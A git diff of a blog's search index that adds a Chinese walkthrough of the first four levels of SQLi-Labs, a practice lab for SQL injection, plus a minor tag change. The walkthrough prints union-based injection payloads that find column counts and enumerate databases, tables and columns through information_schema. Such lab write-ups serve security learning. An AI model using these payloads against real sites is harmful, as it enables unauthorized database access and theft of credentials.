@@ -1,6 +1,60 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SQLi-Labs过关笔记</title>
+    <url>/2019/11/17/SQLi-Labs/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SQLi-Labs是某印度程序猿开发的一套练习SQL注入的靶场，共计60关。难度从浅入深，饱受各大安全爱好者，从业者喜爱，是练习sql注入非常不错的途径。</p>
+<p>原项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+<p>本篇将逐步上传已经完成关卡的攻略过程，以及更新未完成的攻略。<br>以每10关为一大标题，每关为一小标题的形式，方便目录定位及阅览。</p>
+<a id="more"></a>
+
+<h1 id="Less1-Less10"><a href="#Less1-Less10" class="headerlink" title="Less1-Less10"></a>Less1-Less10</h1><h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><p>1、首先已经判断出是 ‘ 闭合，order by判断字段数，从下图可见 3正确4错误 </p>
+<p>-1’order by 3–+</p>
+<img src="/2019/11/17/SQLi-Labs/timg1.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg2.PNG" title="timg">
+
+<p>2、接下来联合查询看回显，得到数据库和用户</p>
+<p>-1’ union select 1,databse(),user()–+</p>
+<img src="/2019/11/17/SQLi-Labs/timg3.PNG" title="timg">
+
+<p>3、爆表名</p>
+<p>-1’ union select 1,2,table_name from information_schema.tables<br>where table_schema=database()–+</p>
+<img src="/2019/11/17/SQLi-Labs/timg4.PNG" title="timg">
+
+<p>4、爆出users中的列名</p>
+<p>-1’ union select 1,2,column_name from information_schema.columns<br>where table_name=’users’–+</p>
+<img src="/2019/11/17/SQLi-Labs/timg5.PNG" title="timg">
+
+<p>5、爆出username，同理可爆出password，less1结束</p>
+<img src="/2019/11/17/SQLi-Labs/timg6.PNG" title="timg">
+
+
+<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>1、判断闭合，发现加入单引号或双引号提示数据库语句错误，最后确定是没有闭合的常规数字型注入</p>
+<img src="/2019/11/17/SQLi-Labs/timg7.PNG" title="timg">
+
+<p>2、之后的过程同less1一样，不再重复描述，less2结束</p>
+<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>1、判断闭合，加入单引号，发现报错。 可以通过报错判断出，是 ‘) 闭合</p>
+<img src="/2019/11/17/SQLi-Labs/timg8.PNG" title="timg">
+
+<p>2、看回显，没问题，之后的过程同less1一样，不再重复描述，less3结束</p>
+<img src="/2019/11/17/SQLi-Labs/timg9.PNG" title="timg">
+
+<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>1、判断闭合，加入’发现没有报错，加入”报错，通过报错可以判断，是”）闭合</p>
+<img src="/2019/11/17/SQLi-Labs/timg10.PNG" title="timg">
+
+<p>2、看回显，没问题，之后过程同less1一样，不再重复描述，less4结束</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>靶场练习</tag>
+        <tag>Web渗透</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>尘</title>
     <url>/2019/11/13/%E5%B0%98/</url>
     <content><![CDATA[<h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>尘，不知道下一刻自己会去哪</p>
@@ -548,8 +602,8 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
       </categories>
       <tags>
         <tag>Web</tag>
-        <tag>社工</tag>
         <tag>信息搜集</tag>
+        <tag>社工</tag>
       </tags>
   </entry>
   <entry>
